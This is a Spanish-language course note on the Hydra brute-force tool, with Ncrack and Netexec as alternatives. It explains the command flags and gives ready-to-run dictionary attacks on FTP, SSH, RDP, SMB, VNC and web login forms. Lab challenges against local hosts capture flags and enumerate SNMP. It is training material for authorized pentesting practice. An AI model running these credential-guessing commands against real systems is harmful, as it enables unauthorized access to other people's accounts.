---
title: "Guía Básica de Hydra"
aliases:
  - Guía Básica de Hydra
tags:
  - ifct0109/pocs
  - auditoria
  - hydra
---

# 🔐 Guía Básica de Hydra

## ¿Qué es Hydra?

**Hydra** es una herramienta de fuerza bruta rápida y flexible para realizar ataques de login sobre múltiples protocolos y servicios de red.

Admite métodos como FTP, SSH, HTTP, RDP, SMB, VNC, entre otros. Permite probar combinaciones de usuarios y contraseñas de forma automática, usando diccionarios.

## Significado de los parámetros comunes

* `-l`: Nombre de usuario fijo.

* `-L`: Archivo con lista de usuarios.

* `-p`: Contraseña fija.

* `-P`: Archivo con lista de contraseñas.

* `-t`: Número de hilos (threads) simultáneos.

* `-f`: Finaliza al encontrar la primera combinación válida.

## Ejemplos de uso

### ▶️ Fuerza bruta con diccionario

```bash
hydra -l usuario -P rockyou.txt ftp://victima.local -t 4 -f
hydra -l usuario -P rockyou.txt ssh://victima.local -t 4 -f
hydra -l usuario -P rockyou.txt rdp://victima.local -t 4 -f
hydra -l usuario -P rockyou.txt smb://victima.local -t 4 -f
hydra -P rockyou.txt vnc://victima.local -t 4 -f
```

### ▶️ Fuerza bruta en servicios web

```bash
hydra -l usuario -P rockyou.txt victima.local http-get "login"
hydra -l usuario -P rockyou.txt victima.local http-post-form "formulario:username=^USER^&password=^PASS^:Credenciales incorrectas"
```

### ▶️ Uso de archivos de usuarios y contraseñas

```bash
hydra -L ./usuarios.txt -P ./passwords.txt ssh://victima.local -t 4 -f
```

### ▶️ Ataque directo con usuario y contraseña fija

```bash
hydra -l usuario -p contrasena ssh://victima.local -t 4 -f
```

## ⚖️ Herramientas alternativas

### Ncrack

```bash
ncrack -u usuario -P rockyou.txt -T 5 victima.local -p 21
ncrack -u usuario -P rockyou.txt -T 5 victima.local -p 22
ncrack -U ./usuarios.txt -P ./passwords.txt -T 5 victima.local -p 22
ncrack -u usuario -p contrasena -T 5 victima.local -p 22
```

### Netexec

```bash
netexec rdp victima.local -u usuario -p ./minirock.txt
netexec smb victima.local -u usuario -p ./minirock.txt
```

## 🌐 Sitios para practicar Hydra

Para probar Hydra de forma legal y segura, puedes usar laboratorios online como:

* LabEx - Laboratorios gratuitos de Hydra: ejercicios y entornos controlados para practicar ataques de fuerza bruta.

* CloudAcademy - OWASP Hydra Lab: laboratorio guiado sobre ataques por diccionario usando Hydra.

* TryHackMe y Hack The Box: plataformas con escenarios reales para practicar pentesting, muchos incluyen Hydra.

## 🔧 Prácticas de Concepto

**Reto SSH:** Utiliza Hydra para descubrir la contraseña de los siguientes usuarios en un servidor SSH local:

* Usuarios: `pedro`, `ainoa`, `jason`

* Servicio: SSH (puerto 22)

* IP del objetivo: `hydra.local`

Utiliza el diccionario [minirock.txt](../../../archivos_descargados/recursos/minirock.txt).

```bash
wget http://hydra.local/minirock.txt
```

```bash
hydra -l pedro -P minirock.txt ssh://hydra.local -t 4 -f
hydra -l ainoa -P minirock.txt ssh://hydra.local -t 4 -f
hydra -l jason -P minirock.txt ssh://hydra.local -t 4 -f
```

Con ncrack:

```bash
ncrack -u pedro -P minirock.txt ssh://hydra.local
ncrack -u ainoa -P minirock.txt ssh://hydra.local
ncrack -u jason -P minirock.txt ssh://hydra.local
```

---

**Reto FTP:** Utiliza Hydra para descubrir las contraseñas de los usuarios `adam` y `susan` en un servidor FTP local.

* Servicio FTP: transferencia de archivos entre sistemas.

* IP del objetivo: `hydra.local`

```bash
hydra -l adam -P minirock.txt ftp://hydra.local -t 4 -f
hydra -l susan -P minirock.txt ftp://hydra.local -t 4 -f
```

Con ncrack:

```bash
ncrack -u adam -P minirock.txt -T 5 hydra.local -p 21
ncrack -u susan -P minirock.txt -T 5 hydra.local -p 21
```

---

**Reto SMB:** Utiliza Hydra para descubrir la contraseña del usuario `labex` en un servidor SMB local.

* Servicio SMB: compartición de archivos e impresoras en red.

* IP del objetivo: `hydra.local`

```bash
hydra -l labex -P minirock.txt smb://hydra.local -t 4 -f
```

Con netexec:

```bash
netexec smb hydra.local -u labex -p ./minirock.txt
```

---

**Reto VNC:** VNC permite controlar escritorios de forma remota. Atacaremos este servicio con un diccionario.

* Servicio VNC: control remoto de escritorios gráficos.

* IP del objetivo: `hydra.local`

```bash
hydra -P minirock.txt vnc://hydra.local:5901 -t 4 -f
```

---

**Reto RDP:** El protocolo RDP permite acceso remoto a equipos Windows. Usaremos Netexec para lanzar el ataque.

* Servicio RDP: escritorio remoto en sistemas Windows.

* IP del objetivo: `victima.local`

```bash
netexec rdp victima.local -u ifct0109 -p ./minirock.txt
```

---

**Actividad:** Captura las banderas de los usuarios pedro, adam y labex. E investigar en el servicio SNMP.

* Conectar con ssh:

```bash
ssh pedro@hydra.local
$ cat pedro.txt
```

* Conectar por ftp:

```bash
ftp adam@hydra.local
ftp> more adam.txt
```

* Conectar a recurso SMB:

```bash
smbclient \\\\hydra.local\\share -U labex
smb: \> more labex.txt
```

* Investigar SNMP:

```bash
sudo apt update
sudo apt install snmpcheck snmp
snmp-check -c public hydra.local
snmpwalk -v2c -c secret hydra.local
snmpwalk -v2c -c secret hydra.local | grep -i flag
snmpwalk -v2c -c secret hydra.local > snmp.txt && nano snmp.txt
	CTRL+X          // Para salir
```

* Conectar a VNC:

```bash
vncviewer hydra.local:5901
```
